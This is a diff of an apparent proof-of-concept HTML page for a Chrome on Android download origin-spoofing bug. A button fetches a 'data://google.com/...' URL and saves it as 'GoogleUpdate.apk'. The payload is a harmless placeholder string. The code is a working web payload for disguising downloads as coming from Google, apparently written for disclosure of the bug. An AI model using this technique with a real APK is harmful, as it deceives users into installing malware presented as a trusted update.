@@ -2,41 +2,41 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
+  <title>Chrome Android Origin Spoof PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 60px;
+    }
+    button {
+      font-size: 18px;
+      padding: 14px 28px;
+      border-radius: 8px;
+      border: none;
+      background: #1a73e8;
+      color: white;
+    }
+  </style>
 </head>
+
 <body>
-  <center><h2>POC by Chigorin!</h2></center>
+  <h2>Download Origin Spoof PoC</h2>
+  <p>Tap the button below</p>
+
+  <button onclick="download()">Download</button>
 
   <script>
-    // Listen to any keydown
-    window.addEventListener('keydown', function(e) {
-      // open the download
-      openWin();
-      // request fullscreen
-      //goFullScreen();
-    });
-
-    // Download helper
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+    function download() {
+      const a = document.createElement("a");
+      a.href =
+        "data://google.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==";
+      a.download = "GoogleUpdate.apk";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
     }
-
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "google.apk"
-      );
-    }
-
   </script>
-  
-
-  
 </body>
 </html>
